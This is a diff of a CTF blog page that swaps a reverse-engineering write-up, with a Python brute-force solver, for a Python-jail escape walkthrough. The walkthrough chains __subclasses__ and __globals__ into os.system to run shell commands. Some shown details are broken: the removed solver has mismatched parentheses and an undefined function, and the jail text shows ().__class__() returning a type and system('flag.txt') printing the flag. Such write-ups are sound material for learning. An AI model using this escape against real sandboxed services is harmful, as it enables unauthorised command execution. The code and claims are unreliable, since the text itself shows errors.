@@ -9,13 +9,13 @@
         <meta name="author" content="ReemKhalid">
       
       
-        <link rel="canonical" href="https://x-ray2004.github.io/My-Blog/ctf/2026/09/26/cyctf-qualification-2025--reverse-babycrackme/">
+        <link rel="canonical" href="https://x-ray2004.github.io/My-Blog/ctf/2026/09/26/cyctf-qualification-2026--misc-easyjail/">
       
       
-        <link rel="prev" href="../cyctf-qualification-2025--misc-easyjail/">
+        <link rel="prev" href="../cyctf-2026--reverse-takeahook/">
       
       
-        <link rel="next" href="../zinadit-ctf-2026--calcbroken-reversing/">
+        <link rel="next" href="../cyctf-qualification-2026--reverse-babycrackme/">
       
       
         
@@ -26,7 +26,7 @@
     
     
       
-        <title>CyCTF qualification 2025 : Reverse ‘BabyCrackMe’ - VampireXRAY Blog</title>
+        <title>CyCTF qualification 2026 : Misc ‘EasyJail’ - VampireXRAY Blog</title>
       
     
     
@@ -89,7 +89,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#cyctf-qualification-2025-reverse-babycrackme" class="md-skip">
+        <a href="#cyctf-qualification-2026-misc-easyjail" class="md-skip">
           Skip to content
         </a>
       
@@ -123,7 +123,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              CyCTF qualification 2025 : Reverse ‘BabyCrackMe’
+              CyCTF qualification 2026 : Misc ‘EasyJail’
             
           </span>
         </div>
@@ -1224,10 +1224,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
       
         <li class="md-nav__item">
-  <a href="#can-we-crack-the-baby" class="md-nav__link">
+  <a href="#escaped-a-restricted-python-environment" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Can We Crack The Baby ?
+        Escaped a restricted Python environment?
       
     </span>
   </a>
@@ -1235,10 +1235,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#step-1-understanding-the-main-function" class="md-nav__link">
+  <a href="#initial-reconnaissance" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Step 1: Understanding the Main Function
+        Initial Reconnaissance
       
     </span>
   </a>
@@ -1246,10 +1246,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#step-2-analyzing-check_input" class="md-nav__link">
+  <a href="#whats-blocked" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Step 2: Analyzing check_input()
+        What’s Blocked?
       
     </span>
   </a>
@@ -1257,10 +1257,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#step-3-understanding-emit_pair" class="md-nav__link">
+  <a href="#what-still-works" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Step 3: Understanding emit_pair()
+        What Still Works? ✅
       
     </span>
   </a>
@@ -1268,10 +1268,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#step-4-the-obfuscation-functions" class="md-nav__link">
+  <a href="#understanding-pythons-object-model" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Step 4: The Obfuscation Functions
+        Understanding Python’s Object Model
       
     </span>
   </a>
@@ -1279,66 +1279,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#step-5-understanding-the-target-array" class="md-nav__link">
+  <a href="#step-1-explore-the-class-hierarchy" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Step 5: Understanding the TARGET Array
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Step 5: Understanding the TARGET Array">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#the-mapping-character-position-target-bytes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        The Mapping: Character Position → TARGET Bytes
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#step-6-the-key-insight" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 6: The Key Insight
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Step 6: The Key Insight">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#the-brute-force-strategy" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        The Brute Force Strategy
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#solution" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Solution
+        Step 1: Explore the Class Hierarchy
       
     </span>
   </a>
@@ -1346,10 +1290,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#implementation" class="md-nav__link">
+  <a href="#step-2-find-the-index" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Implementation
+        Step 2: Find the Index
       
     </span>
   </a>
@@ -1357,10 +1301,21 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#running-the-solution" class="md-nav__link">
+  <a href="#step-3-access-the-globals-dictionary" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Running the Solution
+        Step 3: Access the Globals Dictionary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-4-execute-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Execute Commands
       
     </span>
   </a>
@@ -1416,7 +1371,7 @@
                           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"></path></svg>
                           <span class="md-ellipsis">
                             
-                              6 min read
+                              2 min read
                             
                           </span>
                         </div>
@@ -1440,242 +1395,94 @@
 
 
 
-<h1 id="cyctf-qualification-2025-reverse-babycrackme">CyCTF qualification 2025 : Reverse ‘BabyCrackMe’</h1>
+<h1 id="cyctf-qualification-2026-misc-easyjail">CyCTF qualification 2026 : Misc ‘EasyJail’</h1>
 <!-- more -->
 
-<h2 id="can-we-crack-the-baby">Can We Crack The Baby ?</h2>
+<h2 id="escaped-a-restricted-python-environment">Escaped a restricted Python environment?</h2>
 <blockquote>
-<p>وما توفيقي إلا بالله :)</p>
+<p><em>وما توفيقي إلا بالله :)</em></p>
 </blockquote>
-<h2 id="step-1-understanding-the-main-function">Step 1: Understanding the Main Function</h2>
-<p>First, let’s look at what <code>main()</code> does:</p>
-<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/1*bYmOu81MGJnP6GOBM2DzIQ.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/1*bYmOu81MGJnP6GOBM2DzIQ.png"></a></p>
-<p>IDA View For Main Function</p>
-<p>Pretty straightforward — After generate pesudocode we can see the program reads our input and passes it to <code>check_input()</code>. If that function returns true, we win.
-For Sorry The file Is not exe so we will continue Staticly</p>
-<p>Now let’s see what <code>check_input()</code> actually does.</p>
-<h2 id="step-2-analyzing-check_input">Step 2: Analyzing check_input()</h2>
-<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/1*sF3GKblAoTuMjaAjQW0OGg.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/1*sF3GKblAoTuMjaAjQW0OGg.png"></a></p>
-<p>IDA View For Check_Input Function</p>
-<p>We can see in Ida view that <code>TARGET_LEN</code> is 60 in decimal so</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/1*JFYYd23LbwJCmrc6L1CcdA.jpeg" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/1*JFYYd23LbwJCmrc6L1CcdA.jpeg"></a></p>
+<p>We’re dropped into a Python REPL with severe restrictions. The goal? Break out and read the flag.</p>
+<h2 id="initial-reconnaissance">Initial Reconnaissance</h2>
+<h2 id="whats-blocked">What’s Blocked?</h2>
+<p>Let’s see what we’re working with:</p>
+<div class="highlight"><pre><span></span><code>&gt;&gt;&gt; import os
+Error: invalid syntax
+&gt;&gt;&gt; os.system("id")
+Error: name 'os' is not defined
+&gt;&gt;&gt; dir(__builtins__)
+Error: name 'dir' is not defined
+&gt;&gt;&gt; str(something)
+Error: name 'str' is not defined
+&gt;&gt;&gt; # This is a comment
+Error: invalid syntax
+</code></pre></div>
+<p>The sandbox blocks:</p>
 <ul>
-<li>The flag length must satisfy: <code>2 * length = TARGET_LEN</code></li>
-<li>Looking at the data section: <code>TARGET_LEN = 0x3C = 60</code></li>
-<li>Therefore: <strong>Flag length = 30 characters</strong></li>
+<li>All imports (<code>import os</code>, <code>import sys</code>)</li>
+<li>Builtin functions (<code>dir()</code>, <code>str()</code>, <code>list()</code>, <code>enumerate()</code>)</li>
+<li>Shell commands (this is Python, not bash)</li>
+<li>Even comments cause syntax errors!</li>
 </ul>
-<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/1*Y3uLvlEAk55sOUYTTVC6wA.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/1*Y3uLvlEAk55sOUYTTVC6wA.png"></a></p>
-<p>IDA View For Check_Input Function</p>
+<h2 id="what-still-works">What Still Works? ✅</h2>
+<div class="highlight"><pre><span></span><code>&gt;&gt;&gt; ().__class__()
+&lt;class 'type'&gt;
+</code></pre></div>
+<p>Object introspection is still available. This is our way out !</p>
+<h2 id="understanding-pythons-object-model">Understanding Python’s Object Model</h2>
+<p>Here’s the key insight: <strong>Everything in Python inherits from </strong><code>&lt;strong class="ol hy"&gt;object&lt;/strong&gt;</code>.</p>
+<div class="highlight"><pre><span></span><code># The chain:
+()                          # Empty tuple (any object works)
+  .__class__                # &lt;class 'tuple'&gt;
+    .__base__               # &lt;class 'object'&gt; (parent class)
+      .__subclasses__()     # [ALL classes in memory]
+</code></pre></div>
+<p>This gives us access to <strong>every class loaded in the Python runtime</strong>. Including classes from restricted modules like <code>os</code>!</p>
+<h2 id="step-1-explore-the-class-hierarchy">Step 1: Explore the Class Hierarchy</h2>
+<div class="highlight"><pre><span></span><code>&gt;&gt;&gt; ().__class__.__base__.__subclasses__()
+[&lt;class 'type'&gt;, ..., &lt;class 'os._wrap_close'&gt;, ...]
+</code></pre></div>
+<p>I noticed <code>os._wrap_close</code> in the output - a class from the <code>os</code> module!</p>
+<h2 id="step-2-find-the-index">Step 2: Find the Index</h2>
+<p>Since <code>str()</code> and <code>enumerate()</code> are blocked, I had to manually search:</p>
+<p>If we little search about main python library we know that the default of sorting the objects in it on linux os is</p>
 <ul>
-<li>Each character is processed by <code>emit_pair()</code> which produces 2 bytes</li>
-<li>These 2 bytes must match the corresponding bytes in the <code>TARGET</code> array</li>
+<li>Index 0–20: Core types (type, int, str, …)</li>
+<li>Index 21–50: Collections (list, dict, set, …)</li>
+<li>Index 51–80: Internal stuff (iterators, generators, …)</li>
+<li>Index 81–110: Import system (_frozen_importlib, …)</li>
+<li>Index 111–130: Codecs &amp; encoding</li>
+<li>Index 131–140: System modules (os, posix, …) # ⬅️ os._wrap_close هنا!</li>
+<li>Index 141+: Site modules (_sitebuiltins, …)</li>
 </ul>
-<h2 id="step-3-understanding-emit_pair">Step 3: Understanding emit_pair()</h2>
-<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/1*PxPrYfu1Y79fCSSx9kxiaQ.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/1*PxPrYfu1Y79fCSSx9kxiaQ.png"></a></p>
-<p>IDA View For emit_pair Function</p>
-<p>This is where things get interesting:</p>
-<p>Breaking it down:</p>
-<ul>
-<li><code>a1</code> = the input character</li>
-<li><code>a2</code> = position in the string (0, 1, 2, ...)</li>
-<li>The function selects one of 10 obfuscation functions based on: <code>(9 * position + 7) % 10</code></li>
-<li>It performs bit rotations (<code>rol8</code>, <code>ror8</code>) and XOR operations</li>
-<li>Returns 2 bytes that depend on both the character and its position</li>
-</ul>
-<h2 id="step-4-the-obfuscation-functions">Step 4: The Obfuscation Functions</h2>
-<p>There are 10 different obfuscation functions (<code>obfuscate1</code> through <code>obfuscate10</code>), each doing complex arithmetic (SAME WAY):</p>
-<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/1*bCi9s-cZSyzC6Pjo2SVGKg.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/1*bCi9s-cZSyzC6Pjo2SVGKg.png"></a></p>
-<p>IDA View For Obfuscation Functions</p>
-<p>These functions use:</p>
-<ul>
-<li>32-bit rotations (<code>rol32</code>, <code>ror32</code>)</li>
-<li>Large magic constants</li>
-<li>Multiplication and XOR operations</li>
-</ul>
-<p>The good news? <strong>We don’t need to reverse these functions!</strong></p>
-<p>We will depend on brute force Why ?
-To solve for <code>a1</code>:</p>
-<ul>
-<li>Inverse rotate <code>v7</code> to get: <code>a2 + (v9 ^ a1)</code></li>
-<li>Subtract <code>a2</code>: <code>v9 ^ a1</code></li>
-<li>XOR with <code>v9</code>: <code>a1 = (v9 ^ a1) ^ v9</code> ✓</li>
-</ul>
-<p><strong>BUT</strong> we can’t compute <code>v9</code> because it requires calling <code>OBF[...](a2)</code> which depends on the obfuscation functions we can't invert!</p>
-<h2 id="step-5-understanding-the-target-array">Step 5: Understanding the TARGET Array</h2>
-<p>Before we dive into the solution, let’s understand what we’re matching against:</p>
-<div class="highlight"><pre><span></span><code>TARGET = [0xC2, 0x20, 0xF7, 0x2C, 0xAD, 0xE2, 0x6B, 0x55, ...]
-//        ^     ^     ^     ^     ^     ^
-//       [0]   [1]   [2]   [3]   [4]   [5]  ...
+<div class="highlight"><pre><span></span><code>&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[120]
+&lt;class '_frozen_importlib_external.PathFinder'&gt;
+&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[130]
+&lt;class 'collections.abc.Hashable'&gt;
+&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[137]
+&lt;class 'os._wrap_close'&gt;  # Found it!
 </code></pre></div>
-<ul>
-<li><strong>Total size</strong>: 60 bytes (TARGET_LEN = 0x3C)</li>
-<li><strong>Flag length</strong>: 60 ÷ 2 = 30 characters (since each character produces 2 bytes)</li>
-</ul>
-<h3 id="the-mapping-character-position-target-bytes">The Mapping: Character Position → TARGET Bytes</h3>
-<p>Here’s the crucial part: <code>emit_pair()</code> produces <strong>2 bytes</strong> for each character. These bytes are stored consecutively in TARGET:</p>
-<div class="highlight"><pre><span></span><code>Flag character at position 0  → TARGET[0] and TARGET[1]
-Flag character at position 1  → TARGET[2] and TARGET[3]
-Flag character at position 2  → TARGET[4] and TARGET[5]
-...
-Flag character at position i  → TARGET[2*i] and TARGET[2*i+1]
-...
-Flag character at position 29 → TARGET[58] and TARGET[59]
+<p><strong>Why start at 120?</strong> From the initial output, I saw <code>os._wrap_close</code> appeared near the end of the list, after <code>collections.abc</code> classes. So I did a binary search in that range instead of starting from 0.</p>
+<h2 id="step-3-access-the-globals-dictionary">Step 3: Access the Globals Dictionary</h2>
+<p>Every Python function has a <code>__globals__</code> dict containing references to its module's namespace:</p>
+<div class="highlight"><pre><span></span><code>&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[137].__init__.__globals__
+{
+  '__name__': 'os',
+  'system': &lt;built-in function system&gt;,
+  'open': &lt;built-in function open&gt;,
+  ...
+}
 </code></pre></div>
-<p><strong>Visual example:</strong></p>
-<div class="highlight"><pre><span></span><code># When we process the first character (position 0)
-byte1, byte2 = emit_pair(flag[0], 0)
-</code></pre></div>
-<div class="highlight"><pre><span></span><code># These must match:
-byte1 == TARGET[2*0]     # TARGET[0] = 0xC2
-byte2 == TARGET[2*0 + 1] # TARGET[1] = 0x20
-</code></pre></div>
-<div class="highlight"><pre><span></span><code># When we process the second character (position 1)
-byte1, byte2 = emit_pair(flag[1], 1)
-</code></pre></div>
-<div class="highlight"><pre><span></span><code># These must match:
-byte1 == TARGET[2*1]     # TARGET[2] = 0xF7
-byte2 == TARGET[2*1 + 1] # TARGET[3] = 0x2C
-</code></pre></div>
-<h2 id="step-6-the-key-insight">Step 6: The Key Insight</h2>
-<p>Here’s the crucial realization: <strong>each character is processed independently</strong>. The output for position <code>i</code> only depends on:</p>
-<ul>
-<li>The character at position <code>i</code></li>
-<li>The position value <code>i</code> itself</li>
-</ul>
-<p>This means we can brute-force each position separately!</p>
-<h3 id="the-brute-force-strategy">The Brute Force Strategy</h3>
-<p>For each position (0–29):</p>
-<ol>
-<li>Get the target bytes: <code>TARGET[2*position]</code> and <code>TARGET[2*position+1]</code></li>
-<li>Try all printable ASCII characters (space to \~, about 95 characters)</li>
-<li>For each character, call <code>emit_pair(character, position)</code></li>
-<li>Check if the output matches our target bytes</li>
-<li>When we find a match, that’s the correct character at that position!</li>
-</ol>
-<p><strong>Concrete example for position 0:</strong></p>
-<div class="highlight"><pre><span></span><code># Target bytes for position 0
-target = (TARGET[0], TARGET[1]) = (0xC2, 0x20)
-</code></pre></div>
-<div class="highlight"><pre><span></span><code># Try characters:
-emit_pair(ord('a'), 0) → (0x45, 0x12) ✗ no match
-emit_pair(ord('b'), 0) → (0x78, 0x9A) ✗ no match
-emit_pair(ord('f'), 0) → (0xC2, 0x20) ✓ MATCH!
-</code></pre></div>
-<div class="highlight"><pre><span></span><code># Found it! flag[0] = 'f'
-</code></pre></div>
-<p>Total attempts: 30 positions × 95 characters = <strong>2,850 attempts</strong> (very fast!)</p>
-<h2 id="solution">Solution</h2>
-<h2 id="implementation">Implementation</h2>
-<p>I wrote a Python script that:</p>
-<ol>
-<li><strong>Reimplements all the rotation functions</strong> (<code>rol8</code>, <code>ror8</code>, <code>rol32</code>, <code>ror32</code>)</li>
-<li><strong>Reimplements all 10 obfuscation functions</strong> exactly as they appear in the binary</li>
-<li><strong>Reimplements emit_pair()</strong> with the same logic</li>
-<li><strong>Brute-forces each position</strong> by trying all printable ASCII characters</li>
-</ol>
-<p>Key code snippets:</p>
-<div class="highlight"><pre><span></span><code># Brute force each position
-for i in range(30):
-    target_pair = (TARGET[2*i], TARGET[2*i + 1])
-    for c in range(32, 127):  # Printable ASCII
-        if emit_pair(c, i) == target_pair:
-            flag.append(chr(c))
-            break
-</code></pre></div>
-<h2 id="running-the-solution">Running the Solution</h2>
-<p>Execute the Python script, and it will output the flag character by character!</p>
-<div class="highlight"><pre><span></span><code>def ror8(val, shift):
-    """8-bit rotate right"""
-    val &amp;= 0xFF
-    shift &amp;= 7
-    return ((val &gt;&gt; shift) | (val &lt;&lt; (8 - shift))) &amp; 0xFF
-def rol32(val, shift):
-    """32-bit rotate left"""
-    val &amp;= 0xFFFFFFFF
-    shift &amp;= 31
-    return ((val &lt;&lt; shift) | (val &gt;&gt; (32 - shift))) &amp; 0xFFFFFFFF
-def ror32(val, shift):
-    """32-bit rotate right"""
-    val &amp;= 0xFFFFFFFF
-    shift &amp;= 31
-    return ((val &gt;&gt; shift) | (val &lt;&lt; (32 - shift))) &amp; 0xFFFFFFFF
-def to_signed32(val):
-    """Convert to signed 32-bit"""
-    val &amp;= 0xFFFFFFFF
-    return val if val &lt; 0x80000000 else val - 0x100000000
-# Obfuscation functions
-def obfuscate1(a1):
-    return (to_signed32(-1547330877 * rol32((a1 ^ 0xD00DF00D) - 1056969199, 9)) ^ 0x13579BDF) &amp; 0xFFFFFFFF
-def obfuscate2(a1):
-    return (ror32(to_signed32(-1640531535 * ((a1 ^ 0xF0E1D2C3) + 270544960)), 13) ^ 0x31415926) &amp; 0xFFFFFFFF
-def obfuscate3(a1):
-    return (rol32(to_signed32(-559038737 * ((a1 ^ 0xC3E2D1F0) + 1515870810)), 7) ^ 0x89ABCDEF) &amp; 0xFFFFFFFF
-def obfuscate4(a1):
-    return (to_signed32(2135587861 * (rol32(a1, 5) ^ 0xA5A5A5A5)) + 464371934 ^ 0xF0F0F0F) &amp; 0xFFFFFFFF
-def obfuscate5(a1):
-    return (to_signed32(-2048144789 * ror32((a1 + 523124044) ^ 0xC001D00D, 3)) ^ 0xDEADC0DE) &amp; 0xFFFFFFFF
-def obfuscate6(a1):
-    return (to_signed32(668265261 * rol32((a1 ^ 0x2468ACE1) - 889275714, 17)) ^ 0xBADC0DE) &amp; 0xFFFFFFFF
-def obfuscate7(a1):
-    return (ror32(to_signed32(-1255572915 * (a1 ^ 0xF1E2D3C)), 11) + 826392149 ^ 0xFEEDFACE) &amp; 0xFFFFFFFF
-def obfuscate8(a1):
-    return (to_signed32(1374496519 * ((rol32(a1, 3) - 1698898192) ^ 0x13572468)) ^ 0xC0FFEE) &amp; 0xFFFFFFFF
-def obfuscate9(a1):
-    return (to_signed32(-1150833019 * (ror32(a1 ^ 0xAAAAAAAA, 7) + 1013904242)) ^ 0xF7F7F7F7) &amp; 0xFFFFFFFF
-def obfuscate10(a1):
-    return ((rol32(to_signed32(-1798288965 * (a1 - 559038242)), 13) ^ 0x600DCAFE) + 305463004) ^ 0x77777777) &amp; 0xFFFFFFFF
-OBF = [obfuscate1, obfuscate2, obfuscate3, obfuscate4, obfuscate5,
-       obfuscate6, obfuscate7, obfuscate8, obfuscate9, obfuscate10]
-def emit_pair(a1, a2):
-    """Emulate the emit_pair function"""
-    v9 = OBF[(9 * a2 + 7) % 10](a2)
-
-    v7 = rol8((a2 + (v9 ^ a1)) &amp; 0xFF, ((a2 ^ ((v9 &gt;&gt; 24) &amp; 0xFF)) &amp; 7))
-    v8 = ror8(((a1 + ((v9 &gt;&gt; 8) &amp; 0xFF)) ^ a2) &amp; 0xFF, (((a2 &gt;&gt; 1) + ((v9 &gt;&gt; 16) &amp; 0xFF)) &amp; 7))
-
-    return v7, v8
-# Target bytes from the binary
-TARGET = [
-    0xC2, 0x20, 0xF7, 0x2C, 0xAD, 0xE2, 0x6B, 0x55, 0xAC, 0xCB,
-    0x32, 0xB6, 0xE4, 0x2D, 0x11, 0x1B, 0xBF, 0x26, 0xDE, 0x2B,
-    0x68, 0x0C, 0x65, 0xDB, 0x63, 0xB6, 0x87, 0x10, 0x36, 0x25,
-    0x3A, 0x76, 0x4C, 0x40, 0xB5, 0x6A, 0x55, 0x2F, 0xF6, 0x59,
-    0x56, 0x91, 0x7A, 0xCD, 0xFD, 0x74, 0x2F, 0xEF, 0xD1, 0x9C,
-    0xC8, 0xED, 0x93, 0x7A, 0xA4, 0x7A, 0xBF, 0x71, 0x0C, 0xCF
-]
-FLAG_LEN = 30
-# Solve for each character
-flag = []
-for i in range(FLAG_LEN):
-    target_pair = (TARGET[2*i], TARGET[2*i + 1])
-
-    # Try all printable ASCII characters
-    found = False
-    for c in range(32, 127):
-        result = emit_pair(c, i)
-        if result == target_pair:
-            flag.append(chr(c))
-            found = True
-            break
-
-    if not found:
-        flag.append('?')
-        print(f"Position {i}: No match found!")
-flag_str = ''.join(flag)
-print(f"Flag: {flag_str}")
-# Verify the solution
-print("\nVerifying...")
-all_correct = True
-for i, c in enumerate(flag_str):
-    result = emit_pair(ord(c), i)
-    expected = (TARGET[2*i], TARGET[2*i + 1])
-    if result != expected:
-        print(f"Position {i} ('{c}'): MISMATCH - got {result}, expected {expected}")
-        all_correct = False
-if all_correct:
-    print("✓ All positions verified correctly!")
+<p>Perfect! The <code>os.system</code> function is right there.</p>
+<h2 id="step-4-execute-commands">Step 4: Execute Commands</h2>
+<div class="highlight"><pre><span></span><code>&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('ls')
+flag.txt
+&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('flag.txt')
+CyCTF{BA6nkRTbx9b0N_dVpIL243pxPKYXnQeYsrNiOYjEk2i65C_U_WG7yrTWdt_O8IJnUqKwydIfIUAAEHRUSFggCp0fyo7XsfC0zk_D}
 </code></pre></div>
 <blockquote>
-<p>إن أصبت فهو من عند الله، وإن أخطأت فهو من نفسي والشيطان :)</p>
+<p><em>إن أصبت فهو من عند الله، وإن أخطأت فهو من نفسي والشيطان :)</em></p>
 </blockquote>
 
 
@@ -1697,7 +1504,7 @@ if all_correct:
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="September 27, 2026 17:56:36 UTC">September 27, 2026</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="September 28, 2026 03:54:40 UTC">September 28, 2026</span>
   </span>
 
     
@@ -1739,7 +1546,7 @@ if all_correct:
       <nav class="md-footer__inner md-grid" aria-label="Footer">
         
           
-          <a href="../cyctf-qualification-2025--misc-easyjail/" class="md-footer__link md-footer__link--prev" aria-label="Previous: CyCTF qualification 2025 : Misc ‘EasyJail’">
+          <a href="../cyctf-2026--reverse-takeahook/" class="md-footer__link md-footer__link--prev" aria-label="Previous: CyCTF 2026 — Reverse “TakeAHook”">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
@@ -1749,20 +1556,20 @@ if all_correct:
                 Previous
               </span>
               <div class="md-ellipsis">
-                CyCTF qualification 2025 : Misc ‘EasyJail’
+                CyCTF 2026 — Reverse “TakeAHook”
               </div>
             </div>
           </a>
         
         
           
-          <a href="../zinadit-ctf-2026--calcbroken-reversing/" class="md-footer__link md-footer__link--next" aria-label="Next: ZinadIT CTF 2026 — Calc&amp;amp;Broken Reversing">
+          <a href="../cyctf-qualification-2026--reverse-babycrackme/" class="md-footer__link md-footer__link--next" aria-label="Next: CyCTF qualification 2026 : Reverse ‘BabyCrackMe’">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Next
               </span>
               <div class="md-ellipsis">
-                ZinadIT CTF 2026 — Calc&amp;Broken Reversing
+                CyCTF qualification 2026 : Reverse ‘BabyCrackMe’
               </div>
             </div>
             <div class="md-footer__button md-icon">
